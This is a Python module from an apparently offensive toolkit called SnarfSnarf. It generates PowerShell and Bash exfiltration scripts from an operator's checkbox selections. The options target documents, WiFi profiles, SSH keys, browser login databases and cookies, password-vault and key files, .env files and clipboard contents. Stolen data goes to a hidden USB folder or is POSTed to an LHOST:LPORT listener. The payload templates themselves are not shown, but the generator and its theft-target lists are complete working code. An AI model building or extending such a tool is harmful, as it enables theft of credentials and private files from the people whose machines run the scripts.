"""
SnarfSnarf — visual exfil script generator (Phase 5.1).
Builds PowerShell / Bash payloads from operator checkbox selections.
"""

import re
from pathlib import Path
from typing import Any, Optional

try:
    from jinja2 import Environment, FileSystemLoader, select_autoescape
    HAS_JINJA = True
except ImportError:
    HAS_JINJA = False

from config import USERS_DIR

TEMPLATES_DIR = Path(__file__).parent / "templates"

# Checkbox options exposed to the web UI
EXFIL_TARGETS = [
    {"id": "documents", "label": "Documents", "desc": ".docx, .pdf, .xlsx, .txt - Desktop, Documents, Downloads"},
    {"id": "credentials", "label": "Credentials", "desc": "WiFi profiles, SSH keys, browser login DB files"},
    {"id": "sensitive", "label": "Sensitive files", "desc": ".kdbx, .pem, .key, .env, .config"},
    {"id": "browser", "label": "Browser data", "desc": "History, bookmarks, cookies (Chrome, Firefox, Edge)"},
    {"id": "recent", "label": "Recent files", "desc": "Windows recent items / shell:recent"},
    {"id": "clipboard", "label": "Clipboard", "desc": "Current clipboard contents at execution time"},
]

OUTPUT_MODES = [
    {"id": "usb_root", "label": "Copy to USB root"},
    {"id": "usb_hidden", "label": "Copy to hidden folder on USB (.snarf)"},
    {"id": "phone_home", "label": "Phone home - HTTP POST to LHOST:LPORT"},
]

SCRIPT_FORMATS = [
    {"id": "powershell", "label": "PowerShell (Windows)"},
    {"id": "bash", "label": "Bash (Linux/macOS)"},
    {"id": "both", "label": "Both (dual-platform)"},
]

_FILENAME_RE = re.compile(r"[^\w.\-]")


def _env() -> "Environment":
    if not HAS_JINJA:
        raise RuntimeError("jinja2 is required - run: uv sync")
    return Environment(
        loader=FileSystemLoader(str(TEMPLATES_DIR)),
        autoescape=select_autoescape(enabled_extensions=()),
        keep_trailing_newline=True,
    )


def _normalize_config(raw: dict, cfg: Optional[dict] = None) -> dict:
    """Merge API body with user config defaults."""
    cfg = cfg or {}
    targets = raw.get("targets") or {}
    if isinstance(targets, list):
        targets = {t: True for t in targets}

    custom = raw.get("custom_patterns") or []
    if isinstance(custom, str):
        custom = [p.strip() for p in custom.split(",") if p.strip()]

    return {
        "targets": {
            t["id"]: bool(targets.get(t["id"], False))
            for t in EXFIL_TARGETS
        },
        "custom_patterns": custom[:20],
        "output_mode": raw.get("output_mode") or "usb_hidden",
        "zip": bool(raw.get("zip")),
        "zip_password": str(raw.get("zip_password") or ""),
        "format": raw.get("format") or "powershell",
        "lhost": str(raw.get("lhost") or cfg.get("lhost") or "127.0.0.1").strip(),
        "lport": str(raw.get("lport") or cfg.get("lport") or "1337").strip(),
        "catch_token": str(cfg.get("catch_token") or "").strip(),
        "script_name": str(raw.get("script_name") or "snarf_exfil").strip(),
    }


def get_options() -> dict:
    return {
        "targets": EXFIL_TARGETS,
        "output_modes": OUTPUT_MODES,
        "formats": SCRIPT_FORMATS,
    }


def build_script(raw: dict, user_cfg: Optional[dict] = None) -> dict:
    """
    Generate exfil script(s) from operator selections.
    Returns {format, scripts: [{lang, filename, content}], warnings: []}
    """
    conf = _normalize_config(raw, user_cfg)
    if not any(conf["targets"].values()) and not conf["custom_patterns"]:
        raise ValueError("Select at least one exfil target or a custom pattern")

    env = _env()
    warnings: list[str] = []
    scripts: list[dict] = []

    fmt = conf["format"]
    if fmt in ("powershell", "both"):
        tpl = env.get_template("exfil_windows.ps1.j2")
        content = tpl.render(**conf)
        ext = ".ps1"
        scripts.append({
            "lang": "PS1",
            "filename": f"{_safe_stem(conf['script_name'])}.ps1",
            "content": content,
        })
    if fmt in ("bash", "both"):
        tpl = env.get_template("exfil_linux.sh.j2")
        content = tpl.render(**conf)
        scripts.append({
            "lang": "SH",
            "filename": f"{_safe_stem(conf['script_name'])}.sh",
            "content": content,
        })

    if conf["output_mode"] == "phone_home":
        warnings.append(
            "Phone-home mode POSTs to /api/snarf on TSK - use the SNARF → CATCH tab to monitor incoming files."
        )

    return {
        "format": fmt,
        "output_mode": conf["output_mode"],
        "scripts": scripts,
        "warnings": warnings,
    }


def _safe_stem(name: str) -> str:
    stem = _FILENAME_RE.sub("_", name.strip())[:64]
    return stem or "snarf_exfil"


def safe_save_path(username: str, filename: str) -> Path:
    """Resolve a save path under users/<user>/payloads/usb/."""
    safe = _FILENAME_RE.sub("_", filename.strip())
    if not safe or safe.startswith("."):
        raise ValueError("Invalid filename")
    if not (safe.endswith(".ps1") or safe.endswith(".sh")):
        raise ValueError("Filename must end with .ps1 or .sh")

    base = (USERS_DIR / username / "payloads" / "usb").resolve()
    base.mkdir(parents=True, exist_ok=True)
    dest = (base / safe).resolve()
    if not str(dest).startswith(str(base)):
        raise ValueError("Path outside user payload directory")
    return dest


def save_script(username: str, filename: str, content: str) -> Path:
    dest = safe_save_path(username, filename)
    dest.write_text(content, encoding="utf-8")
    return dest
